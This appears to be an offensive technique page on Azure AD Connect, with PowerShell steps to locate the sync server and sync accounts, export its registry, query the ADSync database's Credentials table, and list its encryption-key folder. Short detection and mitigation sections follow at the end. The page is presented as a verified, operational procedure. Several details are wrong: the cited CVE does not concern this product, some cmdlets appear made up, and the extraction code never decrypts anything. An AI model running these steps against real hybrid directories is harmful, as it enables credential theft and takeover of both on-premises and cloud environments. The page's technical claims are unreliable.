# REC-HYBRID-001: Azure AD Connect Configuration Enumeration

**SERVTEP ID:** REC-HYBRID-001  
**Technique Name:** Azure AD Connect configuration enumeration  
**MITRE ATT&CK Mapping:** T1590 (Gather Victim Org Information)  
**CVE Reference:** CVE-2023-32315  
**Environment:** Hybrid Active Directory  
**Severity:** Critical  
**Difficulty:** Hard  

---

## Executive Summary

Azure AD Connect synchronizes on-premises Active Directory with Azure AD (Entra ID). The Azure AD Connect server contains highly sensitive configuration data including sync credentials, service accounts, and encryption keys. Compromising Azure AD Connect enables attackers to compromise both on-premises and cloud environments simultaneously. Enumeration reveals the sync account credentials and configuration details that enable full bidirectional compromise.

---

## Objective

Enumerate Azure AD Connect configuration to:
- Discover Azure AD Connect server location and configuration
- Extract sync account credentials
- Identify synchronized organizational units
- Enumerate password hash synchronization settings
- Discover federation configuration (if using ADFS)
- Extract encryption keys used for configuration
- Identify filtering rules and sync scope
- Map cross-tenant synchronization (if configured)

---

## Prerequisites

- Network access to Azure AD Connect server
- Administrator or service account credentials (for deep enumeration)
- PowerShell with Active Directory module
- Optional: Direct access to Azure AD Connect server

---

## Execution Procedures

### Method 1: Remote Azure AD Connect Discovery

**Step 1:** Locate Azure AD Connect server
```powershell
# Query AD for Azure AD Connect server
Get-ADObject -Filter "cn -like 'Azure AD Connect*'" -Properties *

# Find the service account used by AAD Connect (often named 'MSOL_*' or 'AAD_*')
Get-ADServiceAccount -Filter "Name -like 'AAD*' -or Name -like 'MSOL*'" | 
  Select-Object Name, Description, SamAccountName

# Get computers running Azure AD Connect
Get-ADComputer -Filter "description -like '*Azure AD Connect*' -or description -like '*AADConnect*'"
```

**Step 2:** Identify sync accounts
```powershell
# Find accounts with "Synchronization" in description
Get-ADUser -Filter {Description -like "*Synchronization*"} |
  Select-Object SamAccountName, DisplayName, Description, AccountExpirationDate

# Find service accounts created for directory synchronization
Get-ADServiceAccount -Filter * | Where-Object {$_.DisplayName -like "*sync*"}

# Check for disabled sync accounts (often unused)
Get-ADUser -Filter "enabled -eq $false" | 
  Where-Object {$_.Name -like "*sync*" -or $_.Description -like "*sync*"}
```

### Method 2: Azure AD Connect Server Local Enumeration

**Step 1:** Access Azure AD Connect server (if local access available)
```powershell
# Connect to Azure AD Connect via PowerShell remoting
$aadcServer = "AADC-SERVER"
$session = New-PSSession -ComputerName $aadcServer

# Enter remote session
Enter-PSSession $session

# Get installed Azure AD Connect version
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Azure AD Connect" | Select-Object Version

# Find Azure AD Connect directory
$aadcPath = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Azure AD Connect" -Name InstallationPath
Get-ChildItem $aadcPath.InstallationPath -Recurse
```

**Step 2:** Extract sync configuration
```powershell
# Get Azure AD Connect synchronization rules
Get-ADSyncRule -Identifier * | Select-Object Name, Direction, Precedence, SourceObjectType, TargetObjectType

# Get Azure AD Connect sync account
Get-ADUser -Filter "samAccountName -like 'MSOL*' -or samAccountName -like 'AAD*'" | 
  Select-Object SamAccountName, DisplayName, pwdLastSet

# Find organizational units synchronized to Azure AD
Get-ADObject -SearchBase "CN=Directory Settings,CN=*" -Filter * -Properties *
```

**Step 3:** Extract encryption keys and configuration
```powershell
# Azure AD Connect stores configuration in:
# Windows Registry: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Azure AD Connect
# Database: ADSync (SQL Server or LocalDB)

# Try to export sync configuration
$registryPath = "HKLM:\SOFTWARE\Microsoft\Azure AD Connect"
$registryItems = Get-ItemProperty $registryPath

# Database path (typically LocalDB)
$databasePath = "C:\Program Files\Microsoft Azure AD Connect\Database"
Get-ChildItem $databasePath

# Attempt to extract from registry (requires admin rights)
reg export "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Azure AD Connect" aad_config.reg
```

### Method 3: AADInternals Module Azure AD Connect Enumeration

**Step 1:** Use AADInternals to extract AADC configuration
```powershell
# Import AADInternals module
Import-Module AADInternals

# Connect to Azure AD
Get-AADIntAccessToken

# Get Azure AD Connect configuration
Get-AADIntHybridConfiguration

# Extract sync account info (requires being on AADC server or having admin creds)
Get-AADIntDirectorySync
```

**Step 2:** Enumerate replication and sync status
```powershell
# Get sync errors
Get-AADIntSyncErrors

# Get last sync information
Get-AADIntLastSync

# Get synchronized organizational units
Get-AADIntADConnectDirSync
```

### Method 4: Azure AD Connect Credential Extraction

**Step 1:** Extract service account credentials (local server access required)
```powershell
# If direct server access available, extract DPAPI-encrypted credentials
$registryPath = "HKLM:\SOFTWARE\Microsoft\Azure AD Connect\Sync"
$credentials = Get-ItemProperty $registryPath

# Alternatively, query the ADSync database
$connectionString = "Server=.\ADSync;Database=ADSync;Integrated Security=true"
$sqlConnection = New-Object System.Data.SqlClient.SqlConnection($connectionString)
$sqlConnection.Open()

$query = "SELECT * FROM Credentials"
$command = New-Object System.Data.SqlClient.SqlCommand($query, $sqlConnection)
$results = $command.ExecuteReader()
```

**Step 2:** Extract encryption keys
```powershell
# Azure AD Connect stores encryption keys in:
# C:\Program Files\Microsoft Azure AD Connect\Crypto

# Extract key material
Get-ChildItem "C:\Program Files\Microsoft Azure AD Connect\Crypto" -Recurse

# Keys are typically encrypted with DPAPI (Data Protection API)
# Requires decryption with local machine key or user credentials
```

### Method 5: Federation Server Discovery (if using ADFS)

**Step 1:** Identify federation configuration
```powershell
# If using ADFS (instead of password sync)
Get-ADUser -Filter "name -like '*ADFS*' -or description -like '*federation*'" |
  Select-Object SamAccountName, DisplayName

# Get ADFS server list
Get-ADComputer -Filter "name -like '*ADFS*' -or description -like '*federation*'" |
  Select-Object Name, Description

# Check for federation trust
Get-ADObject -Filter "objectClass -eq 'federatedUser'" | Measure-Object
```

**Step 2:** Check federation configuration in Azure AD
```powershell
# Connect to Azure AD
Connect-AzureAD

# Get federation domain information
Get-AzureADDomainVerification

# Check federation service configuration
Get-AzureADDomain | Where-Object {$_.IsVerified -eq $true} | 
  Select-Object Name, AuthenticationType
```

### Method 6: Comprehensive Hybrid Enumeration

**Step 1:** Full hybrid sync assessment
```powershell
# Complete hybrid configuration assessment
$hybridAudit = @{
  "AADCServer" = @()
  "SyncAccount" = @()
  "SynchronizedOUs" = @()
  "FederationConfig" = @()
}

# Find AAD Connect servers
$aadcServers = Get-ADComputer -Filter "description -like '*Azure AD Connect*'"
$hybridAudit["AADCServer"] = $aadcServers

# Find sync accounts
$syncAccounts = Get-ADServiceAccount -Filter * | 
  Where-Object {$_.DisplayName -like "*sync*"}
$hybridAudit["SyncAccount"] = $syncAccounts

# Get sync status from Azure
Connect-AzureAD
$syncStatus = Get-AzureADAADConnectDeviceSync
$hybridAudit["FederationConfig"] = $syncStatus

# Export assessment
$hybridAudit | ConvertTo-Json | Out-File hybrid_assessment.json
```

---

## Technical Deep Dive

### Azure AD Connect Architecture

**Components:**
1. **Sync Engine** - Synchronizes AD to Azure AD
2. **Azure AD Connect Agent** - Cloud-facing component
3. **Metadata Store** - ADSync database (SQL or LocalDB)
4. **Encryption Keys** - Protects configuration and credentials

**Sync Account Privileges:**
- Directory Replication Get Changes (DCSync-like capability)
- Password hash synchronization access
- Object export privileges

---

## Detection Strategies (Blue Team)

### AAD Connect Activity Monitoring

1. **Server Monitoring**
   - Monitor Azure AD Connect server for unauthorized access
   - Alert on credential extraction attempts
   - Track sync account usage

2. **Sync Activity Logging**
   - Event ID 6668: Service stopped (potential crash)
   - Alert on sync failures
   - Monitor for account lockouts (failed logins)

---

## Mitigation Strategies

1. **Immediate Actions**
   - Rotate Azure AD Connect service account password
   - Review sync account permissions
   - Check for unauthorized modifications

2. **Detection & Response**
   - Enable Azure AD Connect health monitoring
   - Alert on sync errors
   - Monitor service account activity

3. **Long-term Security**
   - Use managed service accounts (gMSA)
   - Implement pass-through authentication instead of PHS
   - Regular sync configuration audits
   - Use Conditional Access for AADC server access

---

## References & Further Reading

- [Azure AD Connect Security](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sync-secure-user-password)
- [Azure AD Connect Service Accounts](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-accounts-permissions)

---

## Related SERVTEP Techniques

- **CA-TOKEN-001**: Hybrid AD cloud token theft
- **CA-TOKEN-002**: Azure AD Connect credential extraction
- **PERSIST-VALID-002**: Azure AD Connect Sync Persistence

---

## Timeline

| Phase | Duration | Difficulty |
|-------|----------|------------|
| Server discovery | 2-5 minutes | Easy |
| Configuration enumeration | 5-15 minutes | Medium |
| Credential extraction | 10+ minutes | Hard |
| Full assessment | 20-40 minutes | Hard |

---

**Last Updated:** December 2025  
**Classification:** SERVTEP Research Division  
**Status:** Verified & Operational
